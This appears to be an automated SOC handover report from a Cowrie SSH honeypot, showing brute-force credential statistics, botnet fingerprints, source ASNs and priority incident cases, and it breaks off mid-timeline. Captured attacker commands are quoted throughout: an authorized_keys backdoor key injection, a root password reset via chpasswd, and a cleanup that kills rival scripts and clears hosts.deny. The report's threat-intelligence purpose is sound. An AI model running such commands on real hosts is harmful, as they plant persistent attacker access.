# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-05 |
| **Generated At** | 2026-06-05T12:45:32Z |
| **Shift Time** | 12:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **175** |
| Confirmed Threats | **169** |
| False Positives Filtered | **6** (3.4%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **16** |
| High Severity Cases | **45** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **130** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **136** |
| Unique Credential Pairs | **93** |
| Unique Usernames | **65** |
| Unique Passwords | **76** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 45 |
| `345gs5662d34` | 23 |
| `test` | 3 |
| `ubuntu` | 2 |
| `user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 23 |
| `3245gs5662d34` | 22 |
| `123456` | 16 |
| `1234` | 2 |
| `password` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 22 |
| `root` | `root@0` | 1 |
| `apache` | `1234` | 1 |
| `ubuntu` | `ubuntupassword` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root@0` | `50.6.224.135` | 2026-06-05T09:57:32 |
| `root` | `3245gs5662d34` | `50.6.224.135` | 2026-06-05T09:57:38 |
| `root` | `007` | `180.106.83.59` | 2026-06-05T11:02:42 |
| `root` | `3245gs5662d34` | `180.106.83.59` | 2026-06-05T11:02:58 |
| `root` | `Welcome@888!` | `62.171.171.102` | 2026-06-05T11:24:24 |
| `root` | `3245gs5662d34` | `62.171.171.102` | 2026-06-05T11:24:28 |
| `root` | `ASDFG123` | `49.207.245.79` | 2026-06-05T11:30:56 |
| `root` | `3245gs5662d34` | `49.207.245.79` | 2026-06-05T11:30:57 |
| `root` | `1q2w3e4r5t6y7u8i9o` | `49.207.40.162` | 2026-06-05T11:35:00 |
| `root` | `3245gs5662d34` | `49.207.40.162` | 2026-06-05T11:35:02 |
| `root` | `1993` | `49.207.245.79` | 2026-06-05T11:37:48 |
| `root` | `123456Abcd` | `49.207.40.162` | 2026-06-05T11:39:14 |
| `root` | `159357asd` | `49.207.40.162` | 2026-06-05T11:41:19 |
| `root` | `Qwertyuiop2026` | `49.207.245.79` | 2026-06-05T11:41:48 |
| `root` | `pangeran` | `49.207.40.162` | 2026-06-05T11:43:23 |
| `root` | `Royal@123` | `49.207.40.162` | 2026-06-05T11:45:26 |
| `root` | `@qwer2025` | `49.207.245.79` | 2026-06-05T11:46:09 |
| `root` | `!@QW34er` | `49.207.40.162` | 2026-06-05T11:49:25 |
| `root` | `AAbb1234` | `49.207.40.162` | 2026-06-05T11:51:28 |
| `root` | `nsfocus123` | `49.207.40.162` | 2026-06-05T11:57:42 |
| `root` | `banana123` | `49.207.40.162` | 2026-06-05T11:59:49 |
| `root` | `112233..` | `49.207.40.162` | 2026-06-05T12:06:02 |
| `root` | `!@#$qwerASDFzxcv` | `49.207.40.162` | 2026-06-05T12:14:27 |
| `root` | `aA111222` | `49.207.40.162` | 2026-06-05T12:20:45 |
| `root` | `1QAZ2wsx!` | `68.183.178.130` | 2026-06-05T12:28:08 |
| `root` | `3245gs5662d34` | `68.183.178.130` | 2026-06-05T12:28:10 |
| `root` | `P@ssw0rd!2025` | `49.207.40.162` | 2026-06-05T12:29:09 |
| `root` | `test2025@` | `41.111.178.165` | 2026-06-05T12:37:20 |
| `root` | `3245gs5662d34` | `41.111.178.165` | 2026-06-05T12:37:24 |
| `root` | `Qwe123qwe` | `41.111.178.165` | 2026-06-05T12:39:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **175** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 140 |
| Go SSH scanner | 3 |
| OpenSSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 136 | 15 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 2 | 2 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 136 | 15 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `9052c4ab4164...` | OpenSSH | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 22 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:0Pny5ul936nv"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.207.245.79`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `49.207.245.79`, `62.171.171.102`, `180.106.83.59`, `49.207.40.162`, `50.6.224.135`, `41.111.178.165`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **24** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS8473` | Bahnhof AB | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (45)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fd37a3dd46c7

| Field | Detail |
|---|---|
| **Source IP** | `50.6.224[.]135` |
| **First Seen** | 2026-06-05 09:57 |
| **Last Seen** | 2026-06-05 09:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:57:31` | `cowrie.session.connect` |
| `2026-06-05 09:57:31` | `cowrie.client.version` |
| `2026-06-05 09:57:31` | `cowrie.client.kex` |
| `2026-06-05 09:57:32` | `cowrie.login.success` |
| `2026-06-05 09:57:32` | `cowrie.session.params` |
| `2026-06-05 09:57:32` | `cowrie.command.input` |
| `2026-06-05 09:57:32` | `cowrie.command.failed` |
| `2026-06-05 09:57:33` | `cowrie.log.closed` |
| `2026-06-05 09:57:33` | `cowrie.session.params` |
| `2026-06-05 09:57:33` | `cowrie.command.input` |
| `2026-06-05 09:57:34` | `cowrie.session.file_download` |
| `2026-06-05 09:57:34` | `cowrie.log.closed` |
| `2026-06-05 09:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.224[.]135` to AbuseIPDB if not already reported
- [ ] Block `50.6.224[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26fca5dc25a5

| Field | Detail |
|---|---|
| **Source IP** | `50.6.224[.]135` |
| **First Seen** | 2026-06-05 09:57 |
| **Last Seen** | 2026-06-05 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 09:57:37` | `cowrie.session.connect` |
| `2026-06-05 09:57:37` | `cowrie.client.version` |
| `2026-06-05 09:57:37` | `cowrie.client.kex` |
| `2026-06-05 09:57:38` | `cowrie.login.success` |
| `2026-06-05 09:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.224[.]135` to AbuseIPDB if not already reported
- [ ] Block `50.6.224[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee67aecb59f8

| Field | Detail |
|---|---|
| **Source IP** | `180.106.83[.]59` |
| **First Seen** | 2026-06-05 11:02 |
| **Last Seen** | 2026-06-05 11:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:02:40` | `cowrie.session.connect` |
| `2026-06-05 11:02:40` | `cowrie.client.version` |
| `2026-06-05 11:02:41` | `cowrie.client.kex` |
| `2026-06-05 11:02:42` | `cowrie.login.success` |
| `2026-06-05 11:02:42` | `cowrie.session.params` |
| `2026-06-05 11:02:42` | `cowrie.command.input` |
| `2026-06-05 11:02:42` | `cowrie.command.failed` |
| `2026-06-05 11:02:43` | `cowrie.log.closed` |
| `2026-06-05 11:02:48` | `cowrie.session.params` |
| `2026-06-05 11:02:48` | `cowrie.command.input` |
| `2026-06-05 11:02:48` | `cowrie.session.file_download` |
| `2026-06-05 11:02:48` | `cowrie.log.closed` |
| `2026-06-05 11:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.106.83[.]59` to AbuseIPDB if not already reported
- [ ] Block `180.106.83[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bacf67c9af45

| Field | Detail |
|---|---|
| **Source IP** | `180.106.83[.]59` |
| **First Seen** | 2026-06-05 11:02 |
| **Last Seen** | 2026-06-05 11:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:02:52` | `cowrie.session.connect` |
| `2026-06-05 11:02:52` | `cowrie.client.version` |
| `2026-06-05 11:02:52` | `cowrie.client.kex` |
| `2026-06-05 11:02:58` | `cowrie.login.success` |
| `2026-06-05 11:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.106.83[.]59` to AbuseIPDB if not already reported
- [ ] Block `180.106.83[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2e8e2f5039

| Field | Detail |
|---|---|
| **Source IP** | `62.171.171[.]102` |
| **First Seen** | 2026-06-05 11:24 |
| **Last Seen** | 2026-06-05 11:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:24:23` | `cowrie.session.connect` |
| `2026-06-05 11:24:23` | `cowrie.client.version` |
| `2026-06-05 11:24:23` | `cowrie.client.kex` |
| `2026-06-05 11:24:24` | `cowrie.login.success` |
| `2026-06-05 11:24:24` | `cowrie.session.params` |
| `2026-06-05 11:24:24` | `cowrie.command.input` |
| `2026-06-05 11:24:24` | `cowrie.command.failed` |
| `2026-06-05 11:24:24` | `cowrie.log.closed` |
| `2026-06-05 11:24:25` | `cowrie.session.params` |
| `2026-06-05 11:24:25` | `cowrie.command.input` |
| `2026-06-05 11:24:25` | `cowrie.session.file_download` |
| `2026-06-05 11:24:25` | `cowrie.log.closed` |
| `2026-06-05 11:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.171.171[.]102` to AbuseIPDB if not already reported
- [ ] Block `62.171.171[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-055ca7d4f54d

| Field | Detail |
|---|---|
| **Source IP** | `62.171.171[.]102` |
| **First Seen** | 2026-06-05 11:24 |
| **Last Seen** | 2026-06-05 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:24:27` | `cowrie.session.connect` |
| `2026-06-05 11:24:27` | `cowrie.client.version` |
| `2026-06-05 11:24:27` | `cowrie.client.kex` |
| `2026-06-05 11:24:28` | `cowrie.login.success` |
| `2026-06-05 11:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.171.171[.]102` to AbuseIPDB if not already reported
- [ ] Block `62.171.171[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f684440453

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:30 |
| **Last Seen** | 2026-06-05 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:30:55` | `cowrie.session.connect` |
| `2026-06-05 11:30:55` | `cowrie.client.version` |
| `2026-06-05 11:30:55` | `cowrie.client.kex` |
| `2026-06-05 11:30:56` | `cowrie.login.success` |
| `2026-06-05 11:30:56` | `cowrie.session.params` |
| `2026-06-05 11:30:56` | `cowrie.command.input` |
| `2026-06-05 11:30:56` | `cowrie.command.failed` |
| `2026-06-05 11:30:56` | `cowrie.log.closed` |
| `2026-06-05 11:30:56` | `cowrie.session.params` |
| `2026-06-05 11:30:56` | `cowrie.command.input` |
| `2026-06-05 11:30:56` | `cowrie.session.file_download` |
| `2026-06-05 11:30:56` | `cowrie.log.closed` |
| `2026-06-05 11:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26ef8cd6d06

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:30 |
| **Last Seen** | 2026-06-05 11:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:30:57` | `cowrie.session.connect` |
| `2026-06-05 11:30:57` | `cowrie.client.version` |
| `2026-06-05 11:30:57` | `cowrie.client.kex` |
| `2026-06-05 11:30:57` | `cowrie.login.success` |
| `2026-06-05 11:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69bc7860e7ee

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:35 |
| **Last Seen** | 2026-06-05 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:35:00` | `cowrie.session.connect` |
| `2026-06-05 11:35:00` | `cowrie.client.version` |
| `2026-06-05 11:35:00` | `cowrie.client.kex` |
| `2026-06-05 11:35:00` | `cowrie.login.success` |
| `2026-06-05 11:35:00` | `cowrie.session.params` |
| `2026-06-05 11:35:00` | `cowrie.command.input` |
| `2026-06-05 11:35:00` | `cowrie.command.failed` |
| `2026-06-05 11:35:00` | `cowrie.log.closed` |
| `2026-06-05 11:35:01` | `cowrie.session.params` |
| `2026-06-05 11:35:01` | `cowrie.command.input` |
| `2026-06-05 11:35:01` | `cowrie.session.file_download` |
| `2026-06-05 11:35:01` | `cowrie.log.closed` |
| `2026-06-05 11:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef19ffecdb6c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:35 |
| **Last Seen** | 2026-06-05 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:35:02` | `cowrie.session.connect` |
| `2026-06-05 11:35:02` | `cowrie.client.version` |
| `2026-06-05 11:35:02` | `cowrie.client.kex` |
| `2026-06-05 11:35:02` | `cowrie.login.success` |
| `2026-06-05 11:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74792e4fd5e

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:37 |
| **Last Seen** | 2026-06-05 11:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0Pny5ul936nv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:37:48` | `cowrie.session.connect` |
| `2026-06-05 11:37:48` | `cowrie.client.version` |
| `2026-06-05 11:37:48` | `cowrie.client.kex` |
| `2026-06-05 11:37:48` | `cowrie.login.success` |
| `2026-06-05 11:37:48` | `cowrie.session.params` |
| `2026-06-05 11:37:48` | `cowrie.command.input` |
| `2026-06-05 11:37:48` | `cowrie.command.failed` |
| `2026-06-05 11:37:48` | `cowrie.log.closed` |
| `2026-06-05 11:37:48` | `cowrie.session.params` |
| `2026-06-05 11:37:48` | `cowrie.command.input` |
| `2026-06-05 11:37:48` | `cowrie.session.file_download` |
| `2026-06-05 11:37:48` | `cowrie.log.closed` |
